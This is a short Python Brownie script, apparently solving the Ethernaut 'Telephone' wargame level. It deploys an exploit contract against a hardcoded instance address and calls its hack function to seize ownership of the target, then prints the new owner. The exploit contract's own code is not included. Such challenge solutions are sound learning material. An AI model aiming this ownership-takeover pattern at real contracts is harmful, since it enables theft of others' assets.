from brownie import interface, accounts, config, Exploit

INSTANCE_ADDRESS = "0x244b9D6D5F300D80BB10612E1c7E52a4Ac6A9842"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

def hack():
    i = 0
    # grab the Telephone contract Object
    instance_contract = interface.ITelephone(INSTANCE_ADDRESS)
    # deploy the exploit contract
    exploit_contract = Exploit.deploy(INSTANCE_ADDRESS, {"from": ACCOUNT})
    
    # hack the contract
    tx = exploit_contract.hack({"from": ACCOUNT})
    tx.wait(1)
        
    print(f"Contract has been hacked. {instance_contract.owner()} is the new owner")

def main():
    hack()
